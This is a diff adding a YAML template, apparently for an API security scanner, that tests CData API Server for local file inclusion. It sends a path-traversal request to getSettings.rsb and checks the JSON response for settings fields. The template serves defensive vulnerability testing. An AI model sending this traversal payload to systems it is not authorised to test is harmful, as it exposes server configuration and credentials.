@@ -1,0 +1,70 @@
+id: CDATA_API_SERVER_JAVA_LFI
+info:
+  name: "CData API Server Java Local File Inclusion Test"
+  description: "The CData API Server Java Local File Inclusion (LFI) Test checks for vulnerabilities in CData API Server, which could allow attackers to include local files on the server via user-supplied input. If the server improperly handles file paths or input sanitization, attackers might be able to access sensitive system files, such as configuration files, log files, or application data. This could lead to information disclosure or, in some cases, further exploitation like remote code execution. Protecting against LFI requires strict input validation and ensuring file path references are properly sanitized."
+  details: "The CData API Server Java Local File Inclusion (LFI) Test examines the application's handling of user input related to file paths. If CData API Server fails to properly sanitize or validate input, an attacker could manipulate file paths to access restricted local files on the server. This could allow unauthorized access to sensitive files, such as configuration settings, credentials, or log files, potentially exposing critical system information. To mitigate LFI vulnerabilities, it's crucial to validate and sanitize all user inputs, restrict file path access, and implement strong security measures such as file system access controls."
+  impact: "The impact of a CData API Server Java Local File Inclusion (LFI) vulnerability can be severe, as it may allow attackers to gain unauthorized access to sensitive files on the server, such as configuration files or system logs. This could lead to the exposure of credentials, internal system information, or application secrets, increasing the risk of further exploitation. In some cases, LFI vulnerabilities can be leveraged for remote code execution or privilege escalation. Proper input sanitization, access controls, and secure configuration practices are essential to mitigate these risks."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: CDATA_API_SERVER_JAVA_LFI
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+  cwe:
+    - CWE-98
+    - CWE-22
+  cve:
+    - CVE-2021-39433
+    - CVE-2023-22973
+
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+wordLists:
+  paths:
+    - '/ui/..\src\getSettings.rsb?@json'
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_url: "${paths}"
+        - modify_method: GET
+        - replace_body: '{}'
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    length:
+      gt: 0
+    contains_all:
+      - 'items'
+      - "true"
+      - 'notifyemail'
+  response_headers:
+    for_one:
+      key:
+        eq: "content-type"
+      value:
+        eq: "application/json"
+strategy:
+  run_once: /
